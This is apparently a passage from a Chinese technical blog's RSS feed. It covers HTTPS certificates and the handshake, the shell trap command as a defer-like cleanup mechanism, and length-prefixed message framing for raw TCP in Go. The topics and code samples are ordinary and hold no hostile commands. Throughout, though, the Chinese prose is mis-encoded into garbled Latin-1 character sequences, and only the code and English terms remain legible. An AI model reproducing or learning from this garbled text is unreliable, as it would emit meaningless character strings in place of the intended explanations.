&lt;li>ç§é’¥åŠ å¯†ï¼šä½¿ç”¨ç§é’¥å¯¹æ‘˜è¦è¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°æ•°å­—ç­¾åã€‚&lt;/li>
&lt;li>å‘é€æ¶ˆæ¯å’Œç­¾åï¼šæŠŠåŸæ•°æ®å’ŒåŠ å¯†åçš„æ•°æ®æ‘˜è¦æ‰“åŒ…ä¸€èµ·å‘ç»™å¯¹æ–¹ã€‚&lt;/li>
&lt;li>éªŒè¯ï¼šæ¥æ”¶æ–¹ä½¿ç”¨å‘é€æ–¹çš„å…¬é’¥æ¥è§£å¯†æ•°å­—ç­¾åï¼Œå¾—åˆ°æ‘˜è¦ã€‚ç„¶åæ¥æ”¶æ–¹å¯¹æ”¶åˆ°çš„æ¶ˆæ¯ä½¿ç”¨åŒæ ·çš„å“ˆå¸Œç®—æ³•å¾—åˆ°ä¸€ä¸ªæ–°çš„æ‘˜è¦ã€‚å¦‚æœè¿™ä¸¤ä¸ªæ‘˜è¦åŒ¹é…ï¼Œè¯´æ˜æ¶ˆæ¯æœªè¢«ç¯¡æ”¹ï¼Œä¸”ç¡®å®æ˜¯ç”±ç§é’¥çš„æ‰€æœ‰è€…ç­¾åçš„ã€‚&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;p>RSAã€DSAã€ECDSA å’Œ Elliptic Curve Diffie-Hellman (ECDH) æ˜¯ä¸€äº›å¸¸è§çš„éå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚
è¿™äº›ç®—æ³•æ¯ä¸ªæœ‰å…¶ç‹¬ç‰¹çš„ä¼˜ç‚¹å’Œåº”ç”¨åœºæ™¯ï¼Œæ¯”å¦‚ RSA ç”¨äºæ•°å­—ç­¾åï¼ŒECDH é€‚ç”¨äºå¯†é’¥åå•†ã€‚
ä¸å¯¹ç§°åŠ å¯†ç›¸æ¯”ï¼Œéå¯¹ç§°åŠ å¯†ç®—æ³•çš„æ€§èƒ½éƒ½æ¯”è¾ƒä½ã€‚&lt;/p>
&lt;p>&lt;strong>è¯ä¹¦&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>CAï¼šä¹Ÿå°±æ˜¯å¸¸è¯´çš„æ ¹è¯ä¹¦ï¼Œæ“ä½œç³»ç»Ÿé»˜è®¤é›†æˆäº†å¾ˆå¤šæƒå¨æœºæ„çš„æ ¹è¯ä¹¦ï¼Œå› æ­¤ä¸å¿…å†è‡ªå·±å®‰è£…å’Œä¿¡ä»»ä¸€éã€‚&lt;/li>
&lt;li>https è¯ä¹¦ï¼šé€šå¸¸åŒ…æ‹¬ä¸€ä¸ªå…¬é’¥è¯ä¹¦å’Œä¸€ä¸ªç§é’¥ï¼Œå®ƒä»¬ç”±æƒå¨æœºæ„ï¼ˆCAï¼‰ç­¾å‘ï¼Œè¿™äº›æƒå¨æœºæ„é€šå¸¸æ˜¯è¦æ”¶è´¹çš„ï¼Œä¹Ÿæœ‰å…è´¹çš„æœºæ„ï¼Œç±»ä¼¼&lt;a href="https://letsencrypt.org/">Let&amp;rsquo;s Encrypt&lt;/a>ã€‚
å¦ä¸€ç§æ–¹å¼æ˜¯è‡ªå·±ç­¾å‘ï¼Œä¸è¿‡éœ€è¦è®©å®¢æˆ·ç«¯ä¿¡ä»»è‡ªå·±ç­¾å‘çš„CAè¯ä¹¦ï¼Œç›®çš„æ˜¯ä¸ºäº†è®©è‡ªå·±ç­¾å‘çš„åŸŸåè¯ä¹¦é€šè¿‡æ ¡éªŒã€‚&lt;/li>
&lt;li>è¯ä¹¦ç­¾å‘ï¼šå°±æ˜¯ç”¨æƒå¨æœºæ„å¸®ä½ ç”Ÿæˆä¸€ä¸ªç§é’¥ï¼Œå¹¶ä½¿ç”¨å®ƒçš„æ ¹è¯ä¹¦å’Œè¿™ä¸ªç§é’¥å¯¹ä½ çš„åŸŸåè¿›è¡Œè¯ä¹¦ç­¾å‘ï¼Œæœ€åå°†ç­¾å‘åçš„å…¬é’¥è¯ä¹¦å’Œè¿™ä¸ªç§é’¥ç»™ä½ ã€‚&lt;/li>
&lt;/ul>
&lt;p>è¯ä¹¦æ˜¯å»ºç«‹ä¿¡ä»»çš„å…³é”®ï¼ŒåŒ…æ‹¬ CA æ ¹è¯ä¹¦ã€https è¯ä¹¦å’Œè‡ªç­¾åè¯ä¹¦ã€‚CA æä¾›æƒå¨è®¤è¯ï¼Œè€Œè‡ªç­¾åè¯ä¹¦é€‚ç”¨äºå¼€å‘ç¯å¢ƒã€‚&lt;/p>
&lt;p>&lt;strong>https é€šä¿¡æ­¥éª¤&lt;/strong>&lt;/p>
&lt;p>https é€šä¿¡å¤§è‡´ä¸Šæ˜¯åˆ†ä¸º3ä¸ªé˜¶æ®µã€‚&lt;/p>
&lt;ol>
&lt;li>æ¡æ‰‹é˜¶æ®µï¼ˆHandshakeï¼‰ï¼š
&lt;ul>
&lt;li>å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªåŠ å¯†é€šä¿¡çš„è¯·æ±‚ï¼Œè¯·æ±‚ä¸­åŒ…å«æ”¯æŒçš„åŠ å¯†ç®—æ³•å’Œå…¶ä»–ç›¸å…³ä¿¡æ¯ã€‚&lt;/li>
&lt;li>æœåŠ¡å™¨å°†è‡ªå·±çš„è¯ä¹¦ã€æ”¯æŒçš„åŠ å¯†ç®—æ³•ç­‰ä¿¡æ¯å‘é€ç»™å®¢æˆ·ç«¯ã€‚&lt;/li>
&lt;li>å®¢æˆ·ç«¯éªŒè¯æœåŠ¡å™¨çš„è¯ä¹¦æ˜¯å¦æœ‰æ•ˆã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>å¯†é’¥åå•†é˜¶æ®µï¼š
&lt;ul>
&lt;li>åˆ©ç”¨éå¯¹ç§°åŠ å¯†ç®—æ³•ä½¿å¾—åŒæ–¹å®‰å…¨çš„è·å–åˆ°ä¸€ä¸ªä¼šè¯å¯†é’¥ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>åŠ å¯†é€šä¿¡é˜¶æ®µï¼š
&lt;ul>
&lt;li>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä½¿ç”¨åå•†å¥½çš„ä¼šè¯å¯†é’¥è¿›è¡Œå¯¹ç§°åŠ å¯†é€šä¿¡ï¼Œä¿æŠ¤æ•°æ®çš„æœºå¯†æ€§ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>é…ç½®httpsè¯ä¹¦&lt;/strong>&lt;/p>
&lt;p>å¸¸è§çš„webæœåŠ¡å™¨éƒ½æœ‰é…ç½®httpsè¯ä¹¦çš„åŠŸèƒ½ï¼Œä¾‹å¦‚ nginxã€caddyç­‰ã€‚&lt;/p>
&lt;p>åŸºæœ¬ä¸Šåªéœ€è¦æŠŠè¯ä¹¦å’Œç§é’¥é…ç½®åˆ°æŸä¸€ä¸ªç›®å½•ï¼Œæ›´æ”¹webæœåŠ¡å™¨çš„é…ç½®å³å¯ç”Ÿæ•ˆã€‚&lt;/p>
&lt;p>&lt;strong>httpså•å‘è®¤è¯&lt;/strong>&lt;/p>
&lt;p>é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯åªæœ‰ä¸€ä¸ªæ–¹å‘è¿›è¡Œäº†è®¤è¯ï¼Œè¿™é‡ŒæŒ‡çš„æ˜¯å®¢æˆ·ç«¯è®¤è¯ï¼Œé€šå¸¸æµè§ˆå™¨éƒ½ä¼šå¯¹ç½‘ç«™ä¸Šçš„httpsè¯ä¹¦è¿›è¡ŒéªŒè¯ã€‚&lt;/p>
&lt;p>æ­£å¸¸æƒ…å†µä¸‹è®¿é—®httpsç«™ç‚¹ï¼Œæµè§ˆå™¨å·¦ä¸Šè§’çš„å°é”å°±ä¼šæ˜¯ç°è‰²çš„ã€‚ï¼ˆå¦‚æœä½ çš„æµè§ˆå™¨ç‰ˆæœ¬è¿‡ä½ï¼Œæœ‰å¯èƒ½æ˜¯ç»¿è‰²çš„ã€‚ï¼‰&lt;/p>
&lt;p>å½“ https ç«™ç‚¹çš„è¯ä¹¦ä¸æ­£ç¡®æ—¶ï¼Œå°±ä¼šå‡ºç°ä¸€ä¸ªå‡ºç°ã€ä¸å®‰å…¨ã€‘è¿™ä¸ªä¸‰ä¸ªçº¢è‰²çš„å¤§å­—ï¼Œæœ‰ä¸‹é¢å‡ ç§åŸå› ä¼šå¯¼è‡´ä¸å®‰å…¨ã€‚&lt;/p>
&lt;ol>
&lt;li>å½“å‰åŸŸåå’Œè¯ä¹¦ç­¾åçš„åŸŸåä¸åŒ¹é…ã€‚ï¼ˆè¿™ç§æƒ…å†µå°±éœ€è¦é‡æ–°è¿›è¡ŒåŸŸåç­¾å‘äº†ã€‚ï¼‰&lt;/li>
&lt;li>å½“å‰IPå’Œè¯ä¹¦ç­¾åçš„IPä¸åŒ¹é…ã€‚ï¼ˆè¿™ç§æƒ…å†µè¾ƒå°‘ï¼Œå› ä¸ºä¹‹å‰å¸‚é¢ä¸Šçš„æœºæ„éƒ½ä¸ç­¾å‘IPè¯ä¹¦ï¼Œç°åœ¨å¥½åƒä¹Ÿæœ‰äº†ä¸å°‘ã€‚ï¼‰&lt;/li>
&lt;li>è¯ä¹¦è¿‡æœŸäº†ã€‚ï¼ˆéœ€è¦å®šæœŸæ£€æŸ¥åŸŸåæ˜¯å¦è¿‡æœŸå¹¶åŠæ—¶æ›´æ–°ï¼‰&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>httpsåŒå‘è®¤è¯&lt;/strong>&lt;/p></description></item><item><title>Linux Shell å®ç°ç±»ä¼¼ golang defer çš„åŠŸèƒ½</title><link>https://www.typesafe.cn/posts/linux-shell-defer-implementation/</link><pubDate>Wed, 02 Aug 2023 00:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/linux-shell-defer-implementation/</guid><description>&lt;h3 id="åŸºæœ¬ä¿¡æ¯">åŸºæœ¬ä¿¡æ¯&lt;/h3>
&lt;p>trapå‘½ä»¤ç”¨äºæŒ‡å®šåœ¨æ¥æ”¶åˆ°ä¿¡å·åå°†è¦é‡‡å–çš„åŠ¨ä½œã€‚trapå‘½ä»¤æœ‰ä¸¤ç§æ ¼å¼ã€‚&lt;/p>
&lt;ol>
&lt;li>
&lt;p>trap [COMMANDS] [SIGNALS] æ­¤æ ¼å¼ç”¨æ¥æŒ‡å®šåœ¨æ¥æ”¶åˆ° SIGNALS ä¿¡å·åˆ—è¡¨åå°†æ‰§è¡Œçš„å‘½ä»¤ã€‚ ç¤ºä¾‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">trap&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;echo &amp;#39;Ctrl+C is trapped.&amp;#39;&amp;#34;&lt;/span> SIGINT
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¾“å‡ºå°†ä¼šåœ¨ä½ æŒ‰ä¸‹ Ctrl+C æ—¶æ˜¾ç¤ºï¼Œå³åœ¨æ¥æ”¶åˆ° SIGINT ä¿¡å·æ—¶ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>trap - [SIGNALS] æ­¤æ ¼å¼ç”¨æ¥é‡ç½®SIGNALSçš„é»˜è®¤å¤„ç†ç¨‹åºã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">trap&lt;/span> - SIGINT
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¯¥å‘½ä»¤å°†æ¢å¤ SIGINT ä¿¡å·çš„é»˜è®¤å¤„ç†ç¨‹åºã€‚ ä¸€æ—¦æŒ‡å®šäº†ä¿¡å·çš„å¤„ç†ç¨‹åºï¼Œé‚£ä¹ˆåœ¨è„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œéƒ½ä¼šä¿æŒæŒ‡å®šçš„åŠ¨ä½œï¼Œç›´åˆ°è„šæœ¬æ‰§è¡Œç»“æŸã€‚å¦‚æœä½ æƒ³åœ¨è„šæœ¬æ‰§è¡Œå®Œæ¯•åï¼Œä¸å†å¤„ç†è¿™ä¸ªä¿¡å·ï¼Œä½ å¯ä»¥ä½¿ç”¨trap - SIGNALSæ¥é‡ç½®ä¿¡å·çš„é»˜è®¤å¤„ç†ç¨‹åºã€‚&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ trap -l åˆ—å‡ºæ‰€æœ‰çš„ä¿¡å·ï¼Œæˆ–è€… trap å‘½ä»¤ è·å–å½“å‰çš„ trap è®¾ç½®ã€‚&lt;/p>
&lt;p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ä¿¡å·&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>ä¿¡å·å€¼&lt;/th>
 &lt;th>ä¿¡å·å&lt;/th>
 &lt;th>æè¿°&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>1&lt;/td>
 &lt;td>SIGHUP&lt;/td>
 &lt;td>ç»ˆæ­¢æ§åˆ¶è¿›ç¨‹æˆ–è€…è¿›ç¨‹ç»„&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>2&lt;/td>
 &lt;td>SIGINT&lt;/td>
 &lt;td>é€šå¸¸ç”±äºç»ˆç«¯çš„æŒ‚æ–­æˆ–è€…æ­»äº¡è€Œå¯¼è‡´è¿›ç¨‹ä¹Ÿä¸­æ–­&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>3&lt;/td>
 &lt;td>SIGQUIT&lt;/td>
 &lt;td>Quitä¿¡å·ï¼Œå’ŒSIGINTç±»ä¼¼ï¼Œä½†ç”±Quité”®å‘å‡ºï¼Œé€šå¸¸ç”¨ctrl+\ï¼Œæ‰§è¡Œåä¼šç”Ÿæˆcoreæ–‡ä»¶&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>9&lt;/td>
 &lt;td>SIGKILL&lt;/td>
 &lt;td>Killä¿¡å·ï¼Œç”¨äºç»“æŸæœ€ä¸èƒ½ç»ˆæ­¢çš„è¿›ç¨‹ï¼Œä¿¡å·ä¸èƒ½è¢«è¿›ç¨‹æ•æ‰&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>15&lt;/td>
 &lt;td>SIGTERM&lt;/td>
 &lt;td>è¯·æ±‚ä¸­æ­¢è¿›ç¨‹ï¼Œkillå‘½ä»¤ç¼ºçœäº§ç”Ÿè¿™ä¸ªä¿¡å·&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h3 id="ç¤ºä¾‹ä»£ç ">ç¤ºä¾‹ä»£ç &lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">#!/bin/bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cleanup&lt;span style="color:#ff79c6">()&lt;/span> &lt;span style="color:#ff79c6">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">echo&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Caught Interrupt, cleaning up...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4"># åœ¨è¿™é‡Œæ”¾ç½®ä½ çš„æ¸…ç†ä»£ç ã€‚ä¾‹å¦‚ï¼Œåˆ é™¤ä¸€äº›ä¸´æ—¶æ–‡ä»¶ã€‚&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exit_handler&lt;span style="color:#ff79c6">()&lt;/span> &lt;span style="color:#ff79c6">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">echo&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Caught Terminate, exit...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">exit&lt;/span> &lt;span style="color:#bd93f9">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">trap&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;cleanup&amp;#39;&lt;/span> SIGINT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">trap&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;exit_handler&amp;#39;&lt;/span> SIGTERM
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">while&lt;/span> true; &lt;span style="color:#ff79c6">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sleep &lt;span style="color:#bd93f9">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">echo&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;Sleeping...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">done&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚ä½•æµ‹è¯•è¿™æ®µä»£ç ï¼Ÿ&lt;/p></description></item><item><title>è£¸å†™TCPé€šä¿¡çš„æ­£ç¡®æ–¹å¼</title><link>https://www.typesafe.cn/posts/raw-tcp-best-practice/</link><pubDate>Wed, 19 Jul 2023 21:35:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/raw-tcp-best-practice/</guid><description>&lt;blockquote>
&lt;p>TCP æ˜¯ä¸€ç§é¢å‘è¿æ¥çš„ã€å¯é çš„ã€åŸºäºå­—èŠ‚æµçš„ä¼ è¾“å±‚é€šä¿¡åè®®ã€‚&lt;/p>&lt;/blockquote>
&lt;p>ç”±äºTCPçš„ç‰¹æ€§ï¼Œåœ¨è£¸å†™TCPé€šä¿¡çš„æ—¶å€™ï¼Œæ˜¯ä¸èƒ½ç›´æ¥æŠŠæ•°æ®åºåˆ—åŒ–ä¸ºå­—èŠ‚åç›´æ¥å‘é€çš„ï¼Œå¦åˆ™å°±å¯èƒ½ä¼šé‡åˆ°æ•°æ®åŒ…è¢«â€œæˆªæ–­â€æˆ–â€œç²˜åŒ…â€çš„é—®é¢˜ã€‚(ç²˜åŒ…è­¦å¯Ÿæ­£åœ¨èµ¶æ¥ã€‚)&lt;/p>
&lt;h3 id="æˆªæ–­çš„åŸå› ">â€œæˆªæ–­â€çš„åŸå› &lt;/h3>
&lt;p>&lt;strong>æ•°æ®åŒ…ä¹‹æ‰€ä»¥è¢«â€œæˆªæ–­â€ï¼Œæ˜¯å› ä¸ºç½‘å¡çš„ mtuã€‚&lt;/strong>&lt;/p>
&lt;p>MTUï¼ˆMaximum Transmission Unitï¼ŒMTUï¼‰çš„ä¸­æ–‡åç§°æ˜¯ã€æœ€å¤§ä¼ è¾“å•å…ƒã€‘ï¼Œå®ƒæ˜¯æŒ‡ç½‘ç»œèƒ½å¤Ÿä¼ è¾“çš„æœ€å¤§æ•°æ®åŒ…å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚MTUçš„å¤§å°å†³å®šäº†å‘é€ç«¯ä¸€æ¬¡èƒ½å¤Ÿå‘é€æŠ¥æ–‡çš„æœ€å¤§å­—èŠ‚æ•°ã€‚å¦‚æœMTUè¶…è¿‡äº†æ¥æ”¶ç«¯æ‰€èƒ½å¤Ÿæ‰¿å—çš„æœ€å¤§å€¼ï¼Œæˆ–è€…æ˜¯è¶…è¿‡äº†å‘é€è·¯å¾„ä¸Šé€”ç»çš„æŸå°è®¾å¤‡æ‰€èƒ½å¤Ÿæ‰¿å—çš„æœ€å¤§å€¼ï¼Œå°±ä¼šé€ æˆæŠ¥æ–‡åˆ†ç‰‡ç”šè‡³ä¸¢å¼ƒï¼ŒåŠ é‡ç½‘ç»œä¼ è¾“çš„è´Ÿæ‹…ã€‚&lt;/p>
&lt;p>æ™®é€šç½‘å¡å¸¸è§çš„mtuå€¼æ˜¯1500ï¼Œvxlan ç­‰éš§é“åè®®çš„ mtu åˆ™ä¼šå°äº1500ï¼Œè¿™æ˜¯å› ä¸º vxlan ç­‰éš§é“åè®®éœ€è¦å¯¹åŸå§‹æ•°æ®è¿›è¡Œä¸€å±‚å°è£…ï¼Œå¹¶åŠ ä¸Šä¸€ä¸ªåŒ…å¤´ã€‚&lt;/p>
&lt;h3 id="ç²˜åŒ…çš„åŸå› ">â€œç²˜åŒ…â€çš„åŸå› &lt;/h3>
&lt;p>&lt;strong>è€Œæ•°æ®åŒ…ä¹‹æ‰€ä»¥è¢«â€œç²˜åŒ…â€ï¼Œåˆ™æ˜¯å› ä¸ºä¸ç¡®å®šæ¶ˆæ¯çš„è¾¹ç•Œï¼Œæ¥æ”¶ç«¯æ ¹æœ¬ä¸çŸ¥åˆ°è¦æ‹¿å¤šå°‘æ•°æ®ã€‚&lt;/strong>&lt;/p>
&lt;p>ä½ è¯´æˆ‘çŸ¥é“ç½‘å¡çš„ mtu æ˜¯ 1500ï¼Œé‚£æˆ‘ä¸€æ¬¡å–1500ä¸ªå­—èŠ‚å§ï¼Œä½†ä½ æ‹¿åˆ°çš„æ•°æ®æŠ¥æ–‡é‡Œé¢å¾€å¾€ä¼šâ€œç²˜â€ç€ä¸‹ä¸€æ¡æ¶ˆæ¯çš„ä¸€éƒ¨åˆ†ã€‚&lt;/p>
&lt;h3 id="è§£å†³æ–¹æ¡ˆ">è§£å†³æ–¹æ¡ˆ&lt;/h3>
&lt;p>å› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå›ºå®šé•¿åº¦çš„åŒ…å¤´ï¼Œå†™å…¥æ¶ˆæ¯çš„æ—¶å€™ï¼ŒæŠŠæ­£æ–‡çš„é•¿åº¦å†™å…¥åˆ°åŒ…å¤´é‡Œé¢å†æ‰“åŒ…å‘å‡ºï¼Œæ¯æ¬¡è¯»å–æ¶ˆæ¯çš„æ—¶å€™ï¼Œåˆ™å…ˆè¯»å–å›ºå®šé•¿åº¦çš„åŒ…å¤´ï¼Œè§£æå‡ºæ¥æ­£æ–‡çš„é•¿åº¦ï¼Œå†ä½¿ç”¨æ­£æ–‡é•¿åº¦å–è¯»å–æ­£æ–‡ã€‚&lt;/p>
&lt;p>ä»£ç ç¤ºä¾‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-golang" data-lang="golang">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">const&lt;/span> MaxBodyLen = &lt;span style="color:#bd93f9">1&lt;/span>&lt;span style="color:#ff79c6">&amp;lt;&amp;lt;&lt;/span>&lt;span style="color:#bd93f9">32&lt;/span> &lt;span style="color:#ff79c6">-&lt;/span> &lt;span style="color:#bd93f9">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">type&lt;/span> Header [&lt;span style="color:#bd93f9">8&lt;/span>]&lt;span style="color:#8be9fd">byte&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">func&lt;/span> (h Header) &lt;span style="color:#50fa7b">Version&lt;/span>() &lt;span style="color:#8be9fd">int&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">int&lt;/span>(h[&lt;span style="color:#bd93f9">0&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">func&lt;/span> (h Header) &lt;span style="color:#50fa7b">Flag&lt;/span>() &lt;span style="color:#8be9fd">int&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">int&lt;/span>(h[&lt;span style="color:#bd93f9">1&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">func&lt;/span> (h Header) &lt;span style="color:#50fa7b">BodyLen&lt;/span>() &lt;span style="color:#8be9fd">uint32&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> binary.BigEndian.&lt;span style="color:#50fa7b">Uint32&lt;/span>(h[&lt;span style="color:#bd93f9">4&lt;/span>:])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">func&lt;/span> &lt;span style="color:#50fa7b">Read&lt;/span>(conn net.Conn) (Header, []&lt;span style="color:#8be9fd">byte&lt;/span>, &lt;span style="color:#8be9fd">error&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> h &lt;span style="color:#ff79c6">:=&lt;/span> Header{}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _, err &lt;span style="color:#ff79c6">:=&lt;/span> io.&lt;span style="color:#50fa7b">ReadFull&lt;/span>(conn, h[:])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> err &lt;span style="color:#ff79c6">!=&lt;/span> &lt;span style="color:#ff79c6">nil&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> h, &lt;span style="color:#ff79c6">nil&lt;/span>, err
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bodyLen &lt;span style="color:#ff79c6">:=&lt;/span> h.&lt;span style="color:#50fa7b">BodyLen&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> bodyLen &lt;span style="color:#ff79c6">&amp;lt;=&lt;/span> &lt;span style="color:#bd93f9">0&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> h, &lt;span style="color:#ff79c6">nil&lt;/span>, &lt;span style="color:#ff79c6">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> body &lt;span style="color:#ff79c6">:=&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">make&lt;/span>([]&lt;span style="color:#8be9fd">byte&lt;/span>, bodyLen)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _, err = io.&lt;span style="color:#50fa7b">ReadFull&lt;/span>(conn, body)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> err &lt;span style="color:#ff79c6">!=&lt;/span> &lt;span style="color:#ff79c6">nil&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> h, &lt;span style="color:#ff79c6">nil&lt;/span>, err
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> h, body, &lt;span style="color:#ff79c6">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
